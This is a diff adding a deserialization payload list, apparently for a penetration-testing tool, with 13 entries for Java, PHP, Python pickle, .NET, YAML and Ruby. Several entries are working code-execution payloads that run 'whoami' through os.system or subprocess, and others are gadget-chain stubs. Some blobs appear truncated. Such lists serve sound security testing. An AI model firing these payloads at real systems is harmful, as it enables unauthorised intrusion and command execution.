@@ -1,0 +1,19 @@
+# ============================================================================
+# WhiteHatHacker AI — Deserialization Payloads (v3.0)
+# Categories: Java, PHP, Python Pickle, .NET, YAML, Ruby
+# Total: 13 payloads
+# ============================================================================
+
+rO0ABXNyABFqYXZhLnV0aWwuSGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAx3CAAAABAAAAABc3IADGphdmEubmV0LlVSTJYlNzYa/ORyAwAHSQAIaGFzaENvZGVJAARwb3J0TAAJYWF1dGhvcml0eXQAEkxqYXZhL2xhbmcvU3RyaW5nO0wABGZpbGVxAH4AA0wABGhvc3RxAH4AA0wAA3JlZnEAfgADTAAIcHJvdG9jb2xxAH4AA3hw
+aced0005
+O:8:"stdClass":0:{}
+a:1:{s:4:"test";s:4:"test";}
+O:4:"Test":1:{s:3:"cmd";s:6:"whoami";}
+O:40:"Illuminate\Broadcasting\PendingBroadcast":1:{s:4:"test";s:4:"test";}
+Y29zCnN5c3RlbQooUyd3aG9hbWknCnRSLg==
+gASVIAAAAAAAAACMBXBvc2l4lIwGc3lzdGVtlJOUjAd3aG9hbWmUhZRSlC4=
+AAEAAAD/////AQAAAAAAAAAMAgAAAElTeXN0ZW0sIFZlcnNpb249NC4wLjAuMCwgQ3VsdHVyZT1uZXV0cmFsLCBQdWJsaWNLZXlUb2tlbj1iNzdhNWM1NjE5MzRlMDg5
+!!python/object/apply:os.system ['whoami']
+!!python/object/new:subprocess.check_output [['whoami']]
+--- !ruby/object:Gem::Installer i: x
+--- !ruby/hash:ActionController::Routing::RouteSet::NamedRouteCollection ? |
